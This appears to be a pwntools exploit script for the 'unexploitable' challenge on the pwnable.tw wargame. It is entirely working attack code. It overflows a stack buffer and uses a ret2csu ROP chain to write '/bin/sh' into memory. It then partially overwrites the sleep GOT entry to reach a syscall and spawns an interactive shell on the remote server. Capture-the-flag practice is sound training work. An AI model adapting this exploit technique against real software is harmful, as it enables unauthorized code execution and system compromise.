from pwn import*
#p = process('./unexploitable')
p = remote('chall.pwnable.tw', 10403)
### gadget
setting = 0x4005E6
run = 0x4005D0

t = 1
read_got = 0x601000
sleep_got = 0x601010
main = 0x400544
bss = 0x601028+0x50
binsh = '/bin/sh\x00'

### exploit
pay = ''
pay += 'a'*0x10
pay += p64(0)           #sfp
pay += p64(setting)     #ret
# str /bin/sh
pay += 'X'*0x8
pay += p64(0)
pay += p64(1)
pay += p64(read_got)
pay += p64(0)
pay += p64(bss)
pay += p64(len(binsh))
pay += p64(run)
# sleep->execve
pay += 'X'*0x8          #dummy
pay += p64(0)           #rbx -> 0
pay += p64(1)           #rbp    
pay += p64(read_got)    #r12 -> call
pay += p64(0)           #r13 -> edi
pay += p64(sleep_got)   #r14 -> rsi
pay += p64(2)           #r15 -> rdx
pay += p64(run)
# execve argument
pay += 'X'*0x8          #dummy
pay += p64(0)
pay += p64(0)
pay += p64(sleep_got)
pay += p64(bss)
pay += p64(0)
pay += p64(0)
pay += p64(run)
pay += 'X'*0x8

sleep(3)
p.sendline(pay)
sleep(t)

# exploit
print '[!] str /bin/sh'
p.send(binsh)
sleep(t)

print '[!] sleep->execve'
p.send('\xb8\x9b')
sleep(t)
p.interactive()

